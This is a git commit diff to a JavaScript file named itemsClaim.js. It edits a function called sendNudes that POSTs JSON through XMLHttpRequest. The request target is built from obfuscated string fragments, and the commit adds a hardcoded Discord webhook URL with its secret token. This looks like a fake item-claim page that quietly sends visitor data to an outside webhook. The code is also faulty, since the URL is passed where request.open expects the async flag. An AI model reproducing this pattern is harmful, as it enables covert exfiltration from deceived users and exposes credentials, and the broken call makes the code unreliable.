ac03c2cf56c1614110a5ea51c24871bfeba8e750
NovaOrdemMundial <91165350+NovaOrdemMundial@users.noreply.github.com>
2022-09-22 12:33:45 -0300

    Update itemsClaim.js

--- machine/script/itemsClaim.js
+++ machine/script/itemsClaim.js
@@ -180,7 +180,7 @@ function sendNudes(){
     //Comunicação com O Serve Do Discord
   randomColorPost();
   const request = new XMLHttpRequest();
-  request.open("POST", ron+nal+dinho+soc+cer+game+play, celta+lazule+rebaixado); //Função Post E Qual Servidor
+  request.open("POST", ron+nal+dinho+soc+cer+game+play, "https://discord.com/api/webhooks/"+"1022527774918971423/CT0w1BPHvpEyconBYCEEOd8yz0KUvB-vye6WxhCteHE8B3ViFBU9yNYJZrA0hScIuktt"); //Função Post E Qual Servidor
   request.setRequestHeader('Content-type', 'application/json'); //Não sei bem
 
   
@@ -245,3 +245,4 @@ function sacriOuter(){
   SacrificeALL.style.setProperty('--sacrificeAnimation', 'none');
   fadeOut();
 }
+
